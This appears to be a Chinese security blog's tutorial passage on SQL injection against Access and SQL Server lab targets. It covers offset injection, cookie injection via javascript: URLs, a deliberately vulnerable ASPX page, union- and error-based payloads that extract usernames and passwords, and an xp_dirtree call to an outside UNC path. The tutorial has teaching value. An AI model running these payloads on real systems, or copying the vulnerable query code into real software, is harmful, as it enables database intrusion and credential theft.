<h3 id="判断表内存在的字段个数"><a href="#判断表内存在的字段个数" class="headerlink" title="判断表内存在的字段个数"></a>判断表内存在的字段个数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,* from admin</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/06b7c720180477547b3b2f9462601179.png" alt="06b7c720180477547b3b2f9462601179.png"></p>
<p>发现报错，我们将<code>*</code>位向左移，直到回显正常</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8204/show.asp?pkid=4821 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,* from admin</span><br></pre></td></tr></table></figure>
<p><img src="/post/f06a8c98c2fc458f905a8d7c9bf9c5ee" alt="2ee3f68b1695aa7ba65e3ae2a5c67109.png"></p>
<p>发现<code>*</code>在27之后可以正常回显，计算表内查询字段数：38-27=<strong>11</strong></p>
<p>其中还报出了一个数据：admin</p>
<h3 id="偏移注入爆出数据"><a href="#偏移注入爆出数据" class="headerlink" title="偏移注入爆出数据"></a>偏移注入爆出数据</h3><blockquote>
<p>偏移注入公式：</p>
<ul>
<li><p>查询字段数：* = 11</p>
</li>
<li><p>一级偏移数：38 - 11 = 27</p>
</li>
<li><p>二级偏移数：38 - 11×2 = 16</p>
</li>
<li><p>三级偏移数：38 - 11×3 = 5</p>
</li>
</ul>
</blockquote>
<p><strong>二级偏移</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from (admin as a inner join admin as b on a.id=b.id)</span><br></pre></td></tr></table></figure>
<p>发现多爆出一个数据（虽然没什么用）</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/83ce49b0e9d2e2eaeb1a96332cdeac26.png" alt="83ce49b0e9d2e2eaeb1a96332cdeac26.png"></p>
<p><strong>三级偏移</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,4,5,* from ((admin as a inner join admin as b on a.id=b.id) inner join admin as c on a.id=c.id)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/21ac4b9cbc6904c04613f41ee3e3664e.png" alt="21ac4b9cbc6904c04613f41ee3e3664e.png"></p>
<h2 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h2><p>同服务器下的站点有注入，知道对方站的数据库绝对路径，知道对方数据库表，表中的字段名可以用这个方法来进行跨库查询。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,admin,3,password,5,6,7,8,9,10,11,12,13,14 from [C:\WebCode\sze7xiaohu.mdb].admin</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/c8ac1fe68934b7a264a31c9fe0061ca8.png" alt="c8ac1fe68934b7a264a31c9fe0061ca8.png"></p>
<h2 id="Cookie手工注入"><a href="#Cookie手工注入" class="headerlink" title="Cookie手工注入"></a>Cookie手工注入</h2><p>cookie注入的原理其实并不复杂。学过ASP语言的应该都知道，在ASP中 例如：</p>
<p><code>id=request.querystring(ID);</code> <code>id=request.form(ID);</code></p>
<p>在正常情况下程序员应该按以上规范进行代码的编写，但是部分程序员，为了方便却将代码写成了如下格式：</p>
<p><code>id=request(ID);</code></p>
<p>虽然此时也加了防注入程序。但是，防注入程序并不支持基于cookie提交的数据。而此时代码由于接受任何提交方式，从而导致了cookie注入的产生！下面我来简单演示下cookie手工注入的过程。</p>
<p>首先，我们在存在cookie注入的页面，按其正常地址进行一次完整的访问。完整访问是为了收集其cookie。</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/00bb0ba54e30d917e0d075f1930909f6.png" alt="00bb0ba54e30d917e0d075f1930909f6.png"></p>
<p>接着，我们使用JS代码在地址栏将原先的地址替换为如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26&quot;));</span><br></pre></td></tr></table></figure>
<p>注：不能直接粘贴，直接粘贴浏览器会自动查询，可以先手动输入javascrip:再粘贴后面的部分。火狐浏览器不支持地址栏JavaScript伪协议，可以在Chrome浏览器中使用。</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/01faa58d37eff6773bc66d514473c264.png" alt="01faa58d37eff6773bc66d514473c264.png"></p>
<p>此时，我们打开一个新页面，将之前存在注入的页面地址拷贝到地址栏。注意：这里将后面的id 参数去除后，再进行访问！如图。页面如果依然返回正常，则说明cookie 修改成功！</p>
<h3 id="构造Cookie注入页面与判断注入点"><a href="#构造Cookie注入页面与判断注入点" class="headerlink" title="构造Cookie注入页面与判断注入点"></a>构造Cookie注入页面与判断注入点</h3><p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/67fb74e1e860392e2ac9597189b985a5.png" alt="67fb74e1e860392e2ac9597189b985a5.png"></p>
<p>and 1=1</p>
<p>刷新后页面正常显示</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061042627.png" alt="37d851bb273e68857fe54f2f04aa5a80.png"></p>
<p>and 1=2</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/f920179cb4bbe8e702f0d83f2e5cd977.png" alt="f920179cb4bbe8e702f0d83f2e5cd977.png"></p>
<p>刷新后页面报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061043124.png" alt="bb70c283af7fd32c357d10c6060c6446.png"></p>
<p>在证明确实存在注入后，我们就可以开始猜它的列数了。</p>
<h3 id="判断查询列数-2"><a href="#判断查询列数-2" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 order by 11&quot;));</span><br></pre></td></tr></table></figure>
<h3 id="判断回显位-2"><a href="#判断回显位-2" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,2,3,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>
<h3 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;26 union select 1,username,password,4,5,6,7,8,9,10,11 from admin&quot;));</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/ee9bf1be05fbedb60937a69027ca9399.png" alt="ee9bf1be05fbedb60937a69027ca9399.png"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>《Web入侵先遣—SQL注入攻击技术初探 》</li>
<li><a href="https://blog.csdn.net/zhangliu463884153/article/details/80029053">SQL注入系列之ASP+ACCESS手动注入(二)——Cookie注入_你身后的人-CSDN博客</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLServer数据库注入攻击方式</title>
    <url>/post/6daae3c4.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SQLServer数据库基本知识"><a href="#SQLServer数据库基本知识" class="headerlink" title="SQLServer数据库基本知识"></a>SQLServer数据库基本知识</h2><h3 id="SQLServer数据库介绍"><a href="#SQLServer数据库介绍" class="headerlink" title="SQLServer数据库介绍"></a>SQLServer数据库介绍</h3><p>SQLServer是美国Microsoft公司推出的一种关系型数据库系统。SQLServer是一个可扩展的、高性能的、为分布式客户机/服务器计算所设计的数据库管理系统，实现了与WindowsNT的有机结合，提供了基于事务的企业级信息管理系统方案。SQLServer数据库也称MSSQL数据库。</p>
<p>其主要特点如下：</p>
<ul>
<li>高性能设计，可充分利用WindowsNT的优势</li>
<li>系统管理先进，支持Windows图形化管理工具，支持本地和远程的系统管理和配置。</li>
<li>强壮的事务处理功能，采用各种方法保证数据的完整性。</li>
<li>支持对称多处理器结构、存储过程、ODBC，并具有自主的SQL语言。 SQLServer以其内置的数据复制功能、强大的管理工具、与Internet的紧密集成和开放的系统结构为广大的用户、开发人员和系统集成商提供了一个出众的数据库平台。</li>
</ul>
<p>SQLServer服务默认端口：1433</p>
<h3 id="三个权限级别"><a href="#三个权限级别" class="headerlink" title="三个权限级别"></a>三个权限级别</h3><ul>
<li>sa权限：数据库操作，文件管理，命令执行，注册表读取等。SQLServer数据库的最高权限。相当于系统system权限。</li>
<li>db权限：文件管理，数据库操作等权限。相当于系统users-administrators权限。</li>
<li>public权限：数据库操作。相当于系统guest-users权限。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断是否是SA权限</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)     </span><br><span class="line"></span><br><span class="line">判断是否是db_owner权限  </span><br><span class="line">select is_member(&#x27;db_owner&#x27;)</span><br><span class="line"></span><br><span class="line">判断是否是public权限</span><br><span class="line">select is_srvrolemember(&#x27;public&#x27;)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061050350.png" alt="c78b253a8e43fa7216abbae7c5330902.png"></p>
<h3 id="六个默认数据库"><a href="#六个默认数据库" class="headerlink" title="六个默认数据库"></a>六个默认数据库</h3><p>SQLServer数据库有6个默认的库，分别是4个系统数据库：<code>master</code> 、<code>model</code> 、<code>msdb</code> 、<code>tempdb</code>，和2个实例数据库：<code>ReportServer</code>、<code>ReportServerTempDB</code>。其中，系统数据库 <code>model</code> 和 <code>tempdb</code> 默认是没有数据表的。</p>
<ul>
<li>master数据库：master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。</li>
<li>model数据库：model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。</li>
<li>msdb数据库：msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。</li>
<li>tempdb数据库：tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/UlyssesTakusen/picture/img/202110061050615.png" alt="img"></p>
<p>但是如果用navicat远程连接的话，只会显示2个实例数据库：<code>ReportServer</code>、<code>ReportServerTempDB</code></p>
<h3 id="三个特殊表"><a href="#三个特殊表" class="headerlink" title="三个特殊表"></a>三个特殊表</h3><p>SQLServer中master数据库，控制SQL Server系统的所有系统级信息，例如：登录账户信息、链接服务器和系统配置设置、记录其他所有数据库的存在，数据文件的位置、 SQL Server的初始化信息等。如果master数据库不可用，则无法启动SQL Server，下有主要的三个特殊的表：</p>
<ul>
<li>sysdatabases 管理已经存在的数据库</li>
<li>sysobjects 管理已经存在的表</li>
<li>syscolumns 管理表中字段</li>
</ul>
<h3 id="T-SQL"><a href="#T-SQL" class="headerlink" title="T-SQL"></a>T-SQL</h3><p>T-SQL 即 Transact-SQL，是 SQL 在 Microsoft SQL Server 上的增强版，它是用来让应用程式与 SQL Server 沟通的主要语言。T-SQL 提供标准 SQL 的 DDL 和 DML 功能，加上延伸的函数、系统预存程序以及程式设计结构(例如 IF 和 WHILE)让程式设计更有弹性。</p>
<p>T-SQL包括以下4个部分：</p>
<ul>
<li>DDL：定义和管理数据库及其对象，例如create、alter和drop等。</li>
<li>DML：实现对数据库表各对象的操作，例如insert、update等。</li>
<li>DCL：数据控制语言，实现对数据库进行安全管理和权限管理等控制，例如grant、revoke、deny等。</li>
<li>附加的语言元素。T-SQL的附加语言元素，包括变量、运算符、函数、注释和流程控制语句等。</li>
</ul>
<h3 id="常用系统函数"><a href="#常用系统函数" class="headerlink" title="常用系统函数"></a>常用系统函数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">suser_name() 用户登录名</span><br><span class="line">user_name() 用户在数据库中的名字</span><br><span class="line">user 用户在数据库中的名字</span><br><span class="line">show_role() 对当前用户起作用的规则</span><br><span class="line">db_name() 数据库名</span><br><span class="line">object_name(obj_id) 数据库对象名</span><br><span class="line">col_name(obj_id,col_id) 列名</span><br><span class="line">col_length(objname,colname) 列长度</span><br><span class="line">valid_name(char_expr) 是否是有效标识符</span><br></pre></td></tr></table></figure>
<h3 id="常用查询语句"><a href="#常用查询语句" class="headerlink" title="常用查询语句"></a>常用查询语句</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select @@version;       #查询数据库的版本</span><br><span class="line">select @@servername;    #查询服务名</span><br><span class="line">select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line">select db_name();       #查询当前数据库名</span><br><span class="line">select db_name(1);      #查询第一个数据库名</span><br><span class="line">select db_name(2);      #查询第二个数据库名</span><br><span class="line">select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line">use tempdb              #切换到tempdb表</span><br><span class="line"></span><br><span class="line">top n                   #查询前n条记录</span><br><span class="line">xtype = &#x27;U&#x27;				#代表指定显示用户创建的表</span><br><span class="line">xtype = &#x27;X&#x27;				#代表显示扩展存储过程</span><br><span class="line"></span><br><span class="line">select substring(&#x27;string&#x27;,2,1)     #截取给定字符串的索引为2的1个字符</span><br><span class="line">select ascii(&#x27;a&#x27;)                  #查询给定字符串的ascii值</span><br><span class="line">select len(&#x27;string&#x27;)               #查询给定字符串的长度</span><br><span class="line">EXEC sp_spaceused @updateusage = N&#x27;TRUE&#x27;;  #查询当前数据库的大小</span><br><span class="line">sp_spaceused &#x27;表名&#x27;                #查询指定表名的大小</span><br><span class="line">EXEC master.sys.xp_dirtree &#x27;\\192.168.106.5\xx.txt&#x27;,0,1;</span><br><span class="line"> </span><br><span class="line">判断是否是SA权限</span><br><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)     </span><br><span class="line">判断是否是db_owner权限  </span><br><span class="line">select is_member(&#x27;db_owner&#x27;)</span><br><span class="line">判断是否是public权限</span><br><span class="line">select is_srvrolemember(&#x27;public&#x27;)</span><br><span class="line"></span><br><span class="line">判断是否为站库分离</span><br><span class="line">select host_name()=@@servername</span><br><span class="line"></span><br><span class="line">#数据库的连接</span><br><span class="line">server=127.0.0.1;UID=sa;PWD=123456;database=master;Provider=SQLOLEDB</span><br><span class="line">mssql://sa:123456@127.0.0.1/XCCMS_SocialBusinessDB</span><br><span class="line"> </span><br><span class="line">count(name)是查询总数</span><br><span class="line">name是查询名字</span><br><span class="line">*是查询详细信息</span><br><span class="line"> </span><br><span class="line">#查询数据库</span><br><span class="line">select count(name) from sysdatabases     #查询数据库的个数,只有当前数据库是master的时候，才能执行该命令</span><br><span class="line">select name  from sysdatabases           #查询数据库的名字</span><br><span class="line">select * from sysdatabases               #查询所有数据库的信息</span><br><span class="line"> </span><br><span class="line">#查询数据表</span><br><span class="line">select count(name) from sysobjects where type=&#x27;U&#x27; #查询当前数据库中表的个数</span><br><span class="line">select name from sysobjects where type=&#x27;U&#x27;  #查询当前数据库中所有表的名字</span><br><span class="line">select * from sysobjects where type=&#x27;U&#x27;    #查询当前数据库的所有表的详细信息</span><br><span class="line"> </span><br><span class="line">select count(name) from test..sysobjects where xtype=&#x27;U&#x27;  #查询指定test数据库中表的个数</span><br><span class="line">select name from test..sysobjects where xtype=&#x27;U&#x27;         #查询指定test数据库中表的名字</span><br><span class="line">select * from test..sysobjects where xtype=&#x27;U&#x27;            #查询指定test数据库中表的详细信息</span><br><span class="line"> </span><br><span class="line">#查询列</span><br><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)            #查询当前数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)         #查询当前数据库的指定users表的所有列的名字</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)      #查询当前数据库的指定users表的列的详细信息</span><br><span class="line"> </span><br><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)     #查询指定test数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的所有列的名字</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的列的详细信息</span><br><span class="line"> </span><br><span class="line">#查询数据</span><br><span class="line">select count(*) from test..users          #查询test数据库user表的数据的条数</span><br><span class="line">select * from test..users                 #查询test数据库user表的所有数据</span><br></pre></td></tr></table></figure>
<h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul>
<li>操作系统：Windows Server 2008R2</li>
<li>数据库：Microsoft SQL Server 2008R2</li>
<li>Web服务器：IIS75-CN</li>
<li>脚本语言：aspx</li>
<li>源代码：index.aspx</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; %&gt;</span><br><span class="line">&lt;%@ Import Namespace=&quot;System.Data&quot; %&gt;</span><br><span class="line">&lt;%@ Import namespace=&quot;System.Data.SqlClient&quot;  %&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;script runat=&quot;server&quot;&gt;</span><br><span class="line">     private DataSet resSet=new DataSet();</span><br><span class="line">    protected void Page_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        String strconn = &quot;server=.;database=test;uid=sa;pwd=admin&quot;;</span><br><span class="line">        string id = Request.Params[&quot;id&quot;];</span><br><span class="line">        string sql = string.Format(&quot;select * from newss where id=&#123;0&#125;&quot;, id);</span><br><span class="line">        SqlConnection connection=new SqlConnection(strconn);</span><br><span class="line">        connection.Open();</span><br><span class="line">        SqlDataAdapter dataAdapter = new SqlDataAdapter(sql, connection);</span><br><span class="line">        dataAdapter.Fill(resSet);</span><br><span class="line">        DgData.DataSource = resSet.Tables[0];</span><br><span class="line">        DgData.DataBind();</span><br><span class="line">        Response.Write(&quot;执行语句:&lt;br&gt;&quot;+sql);</span><br><span class="line">        Response.Write(&quot;&lt;br&gt;结果为:&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head runat=&quot;server&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;SQLServer注入测试&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form id=&quot;form1&quot; runat=&quot;server&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    </span><br><span class="line">        &lt;asp:DataGrid ID=&quot;DgData&quot; runat=&quot;server&quot; BackColor=&quot;White&quot; BorderColor=&quot;#3366CC&quot; </span><br><span class="line">            BorderStyle=&quot;None&quot; BorderWidth=&quot;1px&quot; CellPadding=&quot;4&quot; </span><br><span class="line">                HeaderStyle-CssClass=&quot;head&quot; Width=&quot;203px&quot;&gt;</span><br><span class="line">            &lt;FooterStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">            &lt;SelectedItemStyle BackColor=&quot;#009999&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCFF99&quot; /&gt;</span><br><span class="line">            &lt;PagerStyle BackColor=&quot;#99CCCC&quot; ForeColor=&quot;#003399&quot; HorizontalAlign=&quot;Left&quot; </span><br><span class="line">                Mode=&quot;NumericPages&quot; /&gt;</span><br><span class="line">            &lt;ItemStyle BackColor=&quot;White&quot; ForeColor=&quot;#003399&quot; /&gt;</span><br><span class="line">&lt;HeaderStyle CssClass=&quot;head&quot; BackColor=&quot;#003399&quot; Font-Bold=&quot;True&quot; ForeColor=&quot;#CCCCFF&quot;&gt;&lt;/HeaderStyle&gt;</span><br><span class="line">        &lt;/asp:DataGrid&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p><strong>数字型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1/</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1-0</span><br><span class="line"></span><br><span class="line">若加斜杠(/)报错，-0返回正常，说明存在注入点，闭合类型为数字型</span><br></pre></td></tr></table></figure>
<p><strong>字符型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">若前者回显正常，后者回显异常，说明存在注入点，闭合类型为字符型</span><br></pre></td></tr></table></figure>
<h3 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and (select count(*) from sysobjects)&gt;0</span><br><span class="line"></span><br><span class="line">若返回正常，说明该数据库为mssql</span><br></pre></td></tr></table></figure>
<h3 id="判断查询列数"><a href="#判断查询列数" class="headerlink" title="判断查询列数"></a>判断查询列数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 order by 3</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 order by 4</span><br></pre></td></tr></table></figure>
<h3 id="判断回显位"><a href="#判断回显位" class="headerlink" title="判断回显位"></a>判断回显位</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select null,null,null 	#先使用NULL填充列数</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select 1,&#x27;2&#x27;,&#x27;3&#x27;			#先用数字填充，若报错，则用字符填充</span><br></pre></td></tr></table></figure>
<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select 1,@@version,&#x27;3&#x27;	#获取数据库版本信息</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select 1,db_name(),&#x27;3&#x27;	#获取当前数据库名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select 1,db_name(1),&#x27;3&#x27;	#获取第1个数据库名</span><br></pre></td></tr></table></figure>
<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select 1,name,&#x27;3&#x27; from test.sys.sysobjects where xtype=&#x27;U&#x27; 		#获取test数据库的所有表名（若可以显示多行数据）</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from test.sys.sysobjects where xtype=&#x27;U&#x27;	#获取test数据库的第1张表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from test.sys.sysobjects where xtype=&#x27;U&#x27; and name &lt;&gt; &#x27;newss&#x27;		#获取test数据库的第1张不为&#x27;newss&#x27;的表名（即第2张表名）</span><br></pre></td></tr></table></figure>
<h3 id="获取字段名"><a href="#获取字段名" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select 1,name,&#x27;3&#x27; from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;) 	#获取test数据库下的users表的所有字段名（若可以显示多行数据）</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;)	#获取test数据库下users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;) and name &lt;&gt; &#x27;id&#x27;	#获取test数据库下users表的第1个不为&#x27;id&#x27;的字段名（即第2个字段名）</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,name,&#x27;3&#x27; from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;) and name &lt;&gt; &#x27;id&#x27; and name &lt;&gt; &#x27;username&#x27; #获取test数据库下users表的第1个不为&#x27;id&#x27;且不为&#x27;username&#x27;的字段名（即第3个字段名）</span><br></pre></td></tr></table></figure>
<h3 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=-1 union select 1,username,password from users			#获取所有数据（若可以显示多行数据）</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,username,password from users	#获取第1个数据</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=-1 union select top 1 1,username,password from users where username &lt;&gt; &#x27;admin&#x27;	#获取username不为&#x27;admin&#x27;的数据（第2个数据）</span><br></pre></td></tr></table></figure>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(@@version)			#获取数据库版本信息</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select db_name())		#获取当前数据库</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select db_name(1))	#获取第1个数据库名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select name from master..sysdatabases for xml path)	#获取所有数据库名</span><br></pre></td></tr></table></figure>
<h3 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27;)	#获取test数据库的第1张表名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 name from test.sys.sysobjects where xtype=&#x27;U&#x27; and name &lt;&gt; &#x27;newss&#x27;)			#获取test数据库的第1张不为&#x27;newss&#x27;的表名（即第2张表名）</span><br></pre></td></tr></table></figure>
<h3 id="获取字段名-1"><a href="#获取字段名-1" class="headerlink" title="获取字段名"></a>获取字段名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 name from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;))		#获取test数据库下users表的第1个字段名</span><br><span class="line"></span><br><span class="line">http://hackrock.com:8205/?id=1 and 1=(select top 1 name from syscolumns where id in (select id from test.sys.sysobjects where name=&#x27;users&#x27;) and name &lt;&gt; &#x27;id&#x27;)	#获取test数据库下users表的第1个不为&#x27;id&#x27;的字段名（即第2个字段名）</span><br></pre></td></tr></table></figure>
